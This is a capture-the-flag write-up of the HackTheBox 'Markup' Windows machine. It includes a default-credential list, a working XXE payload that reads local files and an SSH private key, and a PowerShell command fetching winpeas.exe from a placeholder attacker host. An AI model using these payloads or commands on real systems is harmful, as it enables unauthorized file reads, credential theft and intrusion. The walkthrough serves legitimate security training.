---
title: "HackTheBox - Markup"
author: Nasrallah
description: ""
date: 2022-07-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, burpsuite, xml, xxe]
img_path: /assets/img/hackthebox/machines/markup
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Markup](https://app.hackthebox.com/starting-point?tier=2) from [HackTheBox](https://www.hackthebox.com). The target is running a website vulnerable to XXE, we exploit that and get an ssh private key. We connect to the target and run `winpeas` which finds an administrator's password.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.182.252
Host is up (0.10s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

There are 3 open port,22,80 and 433.

## Web

Let's navigate to the webserver on port 80.

![](1.png)

We got a login page, We can try submit some default credentials like the following:

```
admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
```

We managed to login with `admin:password`

![](2.png)

Going through the website's different pages, we find that we can interact with the website in the `order` page.

![](3.png)

## Burp

Let's fill the input fields and intercept the request using `burp suite` and send it to repeater.

![](4.png)

The website uses `XML` for the orders, let's check if this is vulnerable to XEE.

>XEE: or XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.


# **Foothold**

Since this is a windows machine, we can test the vulnerability with the following payload:

```xml
<?xml version = "1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>
    <order>
        <quantity>
            1
        </quantity>
        <item>
            &xxe;
        </item>
        <address>
            test
        </address>
    </order>
```

Let's edit the request in repeater and send it.

![](5.png)

Great! We can read the `win.ini` file, but what now.

Searching through all windows files can take a very long time, so let's search in the website for anything that might help us.

![](7.png)

Found username `daniel`, let's see if there is an ssh key inside his home directory. `C:\\Users\daniel\.ssh\id_rsa`

![](6.png)

Great! We found ssh private key of daniel, let's copy it to our machine, give it the right permissions and connect with it.

![](8.png)


# **Privilege Escalation**

Let's check ou current privileges on the machine with `whoami /priv`

![](9.png)

Nothing really useful.

I uploaded a copy of `winpeas.exe` to the target using the following command:

```shell
powershell -c wget http://{Attacker_IP}/winpeas.exe -o winpeas.exe
```

After running winpeas, it found Administrator's credentials

![](10.png)

We can use ssh to login as Administrator.

![](11.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).